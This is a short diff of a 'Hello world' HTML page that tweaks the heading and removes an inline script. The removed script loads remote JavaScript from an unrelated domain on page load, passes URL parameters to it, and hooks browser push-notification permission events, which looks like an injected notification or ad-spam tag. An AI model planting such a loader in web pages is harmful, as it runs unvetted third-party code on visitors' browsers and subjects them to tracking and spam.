@@ -5,26 +5,9 @@
     
 </head>
 <body>
-<h1>Hello world, man2!</h1>
+<h1>Hello world, man!</h1>
  
     
-
-<script>
-    const url = new URL(window.location.href);
-    var pci = url.searchParams.get('request_var');
-    var ppi = url.searchParams.get('sourceId');
-    const s = document.createElement('script');
-    s.src='//ciksolre.net/pfe/current/tag.min.js?z=2648054&t=standalone'+'&ymid='+pci+'&var='+ppi;
-    s.onload = (sdk) => {
-        sdk.onPermissionDefault(() => {});
-        sdk.onPermissionAllowed(() => {});
-        sdk.onPermissionDenied(() => {});
-        sdk.onAlreadySubscribed(() => {});
-        sdk.onNotificationUnsupported(() => {});
-    }
-    document.head.appendChild(s);
-</script>
-
 
 
   
